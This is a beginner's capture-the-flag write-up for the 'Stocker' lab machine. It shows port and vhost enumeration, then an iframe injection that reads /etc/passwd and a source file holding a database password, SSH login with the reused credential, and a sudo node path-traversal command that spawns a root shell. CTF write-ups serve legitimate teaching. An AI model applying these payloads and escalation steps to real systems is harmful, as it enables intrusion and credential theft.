First what we need to do is, turn on the nmap and check what's running on the server. This what we got, standard ports onlly HTTP and SSH and also we have a domain.
stocker.htb . 
```
┌──(kali㉿kali)-[~]
└─$ nmap -sCV 10.10.11.196
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 10:15 EDT
Nmap scan report for stocker.htb (10.10.11.196)
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-generator: Eleventy v2.0.0
|_http-title: Stock - Coming Soon!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
You can add this domain by command ```sudo echo "10.10.10.10 stocker.htb" >> /etc/hosts``` let's go into this website and check what's there. But there is nothing intresting, let's try to enumerat directorys. But i don't get also any intresting directory.
```
===============================================================
/css                  (Status: 301) [Size: 178] [--> http://stocker.htb/css/]
/favicon.ico          (Status: 200) [Size: 1150]
/fonts                (Status: 301) [Size: 178] [--> http://stocker.htb/fonts/]
/img                  (Status: 301) [Size: 178] [--> http://stocker.htb/img/]
/index.html           (Status: 200) [Size: 15463]
/js                   (Status: 301) [Size: 178] [--> http://stocker.htb/js/]
```
I decid to enumerat vhost by this command.
```
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb -t 50 --append-domain
```
I got something intrestting subdomain.
```
Found: dev.stocker.htb Status: 302 [Size: 28] [--> /login]
```
Let's insert this in /etc/hosts and check what's there.
I turn on the BurpSuite and intercept the traffic to get all request.
And i found something intresting

![obraz](https://github.com/Anogota/Stocker/assets/143951834/667f2faa-4f1b-4926-b412-7e89875a8632)

in tittle i add <h1>Hello</h1> and its work.

![obraz](https://github.com/Anogota/Stocker/assets/143951834/9d3f6bce-b23e-412b-932d-6483da3d1f75)

I will try maybe to see /etc/passwd, ``` <iframe src=/etc/passwd width=1000px height=1000px></iframe> ``` i got the list of user.Save angoose for late.
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
landscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```
I did some recon and i found this.
inser in title this ```<iframe src=file:///var/www/dev/index.js width=1000px height=1000px``` there is a password :P

```
// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
```
When we have a user and password, let's log in to SSH by this creds.
We go the user flag.

![obraz](https://github.com/Anogota/Stocker/assets/143951834/f04d360e-2d50-498e-ac8e-61c26b997656)

First what i did when i get the user is sudo -l in the easy CTF is always good chose and also in this situation, this what i got.
```
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

I wrote in google node priv escalation, and i got to solution how get a root.
Assume we can execute ‘node’ command as root and js file.
Create the “test.js” under /tmp, which spawns a root shell after executing ‘node’ command.
```
// /tmp/test.js
require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})
```
Now run ‘node’ command as root. We can pass the file using path traversal.
```
sudo /usr/bin/node /usr/local/scripts/../../../tmp/test.js
```
Here the website: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-path-traversal-privilege-escalation/
When you did all this steps u get a root.

![obraz](https://github.com/Anogota/Stocker/assets/143951834/190c20bd-0c8b-450d-8b08-eda990b46350)

That's all pretty easy lab.
